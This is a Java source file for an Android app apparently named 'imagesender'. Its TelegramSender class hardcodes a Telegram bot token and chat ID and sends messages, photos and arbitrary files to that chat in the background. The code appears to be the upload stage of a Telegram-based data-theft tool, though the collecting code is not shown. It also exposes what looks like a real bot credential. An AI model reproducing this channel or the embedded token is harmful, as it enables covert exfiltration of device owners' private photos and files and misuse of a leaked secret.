package com.dotbhai.imagesender;

import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import okhttp3.*;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramSender {
    public static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    public static final String CHAT_ID   = "8197183486";
    private static final String BASE = "https://api.telegram.org/bot" + BOT_TOKEN;

    public static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .build();

    public static void sendMessage(String text) {
        try {
            HttpUrl url = HttpUrl.parse(BASE + "/sendMessage").newBuilder()
                    .addQueryParameter("chat_id", CHAT_ID)
                    .addQueryParameter("text", text)
                    .addQueryParameter("parse_mode", "HTML")
                    .build();
            client.newCall(new Request.Builder().url(url).get().build())
                  .enqueue(silentCallback());
        } catch (Exception e) { Log.e("Tg", e.getMessage()); }
    }

    public static void sendMessageWithButtons(String text, JSONArray keyboard) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", CHAT_ID);
            body.put("text", text);
            body.put("parse_mode", "HTML");
            JSONObject markup = new JSONObject();
            markup.put("inline_keyboard", keyboard);
            body.put("reply_markup", markup);

            Request req = new Request.Builder()
                    .url(BASE + "/sendMessage")
                    .post(RequestBody.create(body.toString(),
                            MediaType.parse("application/json")))
                    .build();
            client.newCall(req).enqueue(silentCallback());
        } catch (Exception e) { Log.e("Tg", e.getMessage()); }
    }

    public static void sendPhoto(File imageFile, String caption) {
        if (imageFile == null || !imageFile.exists()) return;
        try {
            RequestBody fileBody = RequestBody.create(imageFile, MediaType.parse("image/*"));
            MultipartBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption == null ? "" : caption)
                    .addFormDataPart("photo", imageFile.getName(), fileBody)
                    .build();
            client.newCall(new Request.Builder()
                    .url(BASE + "/sendPhoto").post(body).build())
                  .enqueue(silentCallback());
        } catch (Exception e) { Log.e("Tg", e.getMessage()); }
    }

    public static void sendDocument(File file, String caption) {
        if (file == null || !file.exists()) return;
        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
            MultipartBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption == null ? "" : caption)
                    .addFormDataPart("document", file.getName(), fileBody)
                    .build();
            client.newCall(new Request.Builder()
                    .url(BASE + "/sendDocument").post(body).build())
                  .enqueue(silentCallback());
        } catch (Exception e) { Log.e("Tg", e.getMessage()); }
    }

    private static Callback silentCallback() {
        return new Callback() {
            @Override public void onFailure(Call call, java.io.IOException e) {
                Log.e("Tg", "fail: " + e.getMessage());
            }
            @Override public void onResponse(Call call, Response r) { r.close(); }
        };
    }
}